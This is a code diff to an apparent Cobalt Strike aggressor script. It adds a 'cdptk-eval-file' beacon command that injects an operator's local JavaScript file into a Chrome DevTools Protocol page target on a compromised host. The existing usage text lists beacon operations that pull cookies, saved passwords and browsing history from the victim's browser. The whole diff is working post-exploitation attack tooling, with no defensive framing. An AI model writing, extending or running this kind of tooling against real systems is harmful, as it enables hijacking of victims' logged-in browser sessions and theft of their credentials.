@@ -41,10 +41,61 @@ sub run_cdptk {
     beacon_inline_execute($bid, $data, "go", $packed);
 }
 
+sub run_cdptk_eval_file {
+    local('$bid $count $port $target $path $handle $script $data $packed');
+    $bid = $1;
+    $count = size(@_);
+    if ($count != 4) {
+        berror($bid, "Usage: cdptk-eval-file <port> <exact-target-id> <local-js-file>");
+        return;
+    }
+    if (barch($bid) ne "x64") {
+        berror($bid, "cdptk-eval-file requires an x64 beacon");
+        return;
+    }
+    $port = int($2);
+    $target = $3;
+    $path = $4;
+    if ($port < 1 || $port > 65535) {
+        berror($bid, "port must be between 1 and 65535");
+        return;
+    }
+    if (strlen($target) == 0) {
+        berror($bid, "an exact target ID is required");
+        return;
+    }
+    $handle = openf($path);
+    $script = readb($handle, -1);
+    closef($handle);
+    if (strlen($script) == 0) {
+        berror($bid, "JavaScript file is empty or could not be read");
+        return;
+    }
+    if (strlen($script) > 65535) {
+        berror($bid, "JavaScript file exceeds 65535 bytes");
+        return;
+    }
+    $data = read_cdptk_bof();
+    if (strlen($data) == 0) {
+        berror($bid, "could not read cdptk_bof.o");
+        return;
+    }
+    $packed = bof_pack($bid, "zizzi", "eval", $port, $target, $script, 0);
+    btask($bid, "Tasked beacon to evaluate operator-supplied JavaScript in CDP target $target", "T1059.007");
+    beacon_inline_execute($bid, $data, "go", $packed);
+}
+
 alias("cdptk", &run_cdptk);
+alias("cdptk-eval-file", &run_cdptk_eval_file);
 
 beacon_command_register(
     "cdptk",
     "Run one-shot Chrome DevTools Protocol operations.",
-    "Usage: cdptk <discover|tabs|screenshot|cookies|page-new|page-close|contexts|context-dispose|snapshot|extensions-load|bookmarks|history|saved-passwords|extensions|servicenow-gck> [port] [arg1] [arg2] [flags]"
+    "Usage: cdptk <discover|tabs|screenshot|cookies|page-new|page-close|contexts|context-dispose|snapshot|extensions-load|bookmarks|history|saved-passwords|extensions|eval|servicenow-gck> [port] [arg1] [arg2] [flags]"
+);
+
+beacon_command_register(
+    "cdptk-eval-file",
+    "Evaluate a local JavaScript file in an exact CDP page target.",
+    "Usage: cdptk-eval-file <port> <exact-target-id> <local-js-file>"
 );
